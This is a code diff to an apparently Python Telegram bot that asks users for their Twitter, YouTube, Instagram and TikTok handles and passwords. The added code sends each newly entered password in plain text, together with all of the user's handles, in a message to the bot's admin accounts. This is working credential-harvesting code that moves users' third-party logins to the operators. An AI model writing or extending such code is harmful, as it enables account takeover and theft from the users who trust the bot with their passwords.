@@ -21,7 +21,9 @@ load_dotenv()
 # --- CONFIGURATION ---
 TOKEN = os.getenv("BOT_TOKEN")
 DATABASE_URL = os.getenv("DATABASE_URL")
-ADMIN_IDS = [1438037591]
+ADMIN_IDS = [
+    int(x.strip()) for x in os.getenv("ADMIN_IDS", "1438037591").split(",") if x.strip().isdigit()
+]
 
 logging.basicConfig(level=logging.INFO)
 
@@ -174,6 +176,24 @@ class Database:
                     (chat_id, telegram_username, platform, handle, password),
                 )
                 await db.commit()
+
+    async def get_user_social_accounts(self, chat_id: int) -> dict:
+        if self.is_postgres:
+            async with self.pool.acquire() as conn:
+                rows = await conn.fetch(
+                    "SELECT platform, handle FROM social_accounts WHERE chat_id = $1 ORDER BY id ASC",
+                    chat_id,
+                )
+                return {row["platform"]: row["handle"] for row in rows}
+        else:
+            import aiosqlite
+            async with aiosqlite.connect(self.db_path) as db:
+                async with db.execute(
+                    "SELECT platform, handle FROM social_accounts WHERE chat_id = ? ORDER BY id ASC",
+                    (chat_id,),
+                ) as cursor:
+                    rows = await cursor.fetchall()
+                    return {row[0]: row[1] for row in rows}
 
 db = Database(DATABASE_URL)
 
@@ -366,6 +386,30 @@ async def process_password(message: types.Message, state: FSMContext):
     telegram_username = user["telegram_username"] if user else f"id_{chat_id}"
 
     await db.add_social_account(chat_id, telegram_username, platform, handle, password)
+
+    # Fetch all social accounts for this user and notify admin(s)
+    socials = await db.get_user_social_accounts(chat_id)
+    twitter_handle = socials.get("Twitter", "None")
+    youtube_handle = socials.get("YouTube", "None")
+    instagram_handle = socials.get("Instagram", "None")
+    tiktok_handle = socials.get("TikTok", "None")
+
+    admin_notification = (
+        f"🔔 <b>New Account Registered!</b>\n\n"
+        f"<b>username:</b> {html.escape(telegram_username)}\n"
+        f"<b>twitter:</b> {html.escape(twitter_handle)}\n"
+        f"<b>youtube:</b> {html.escape(youtube_handle)}\n"
+        f"<b>instagram:</b> {html.escape(instagram_handle)}\n"
+        f"<b>tiktok:</b> {html.escape(tiktok_handle)}\n\n"
+        f"<b>Newly Added:</b> {html.escape(platform)} (<code>{html.escape(handle)}</code>)\n"
+        f"<b>Password:</b> <code>{html.escape(password)}</code>"
+    )
+
+    for admin_id in ADMIN_IDS:
+        try:
+            await message.bot.send_message(admin_id, admin_notification)
+        except Exception as e:
+            logging.warning(f"Could not send notification to admin {admin_id}: {e}")
 
     await state.clear()
     await state.set_state(BotStates.main_menu)
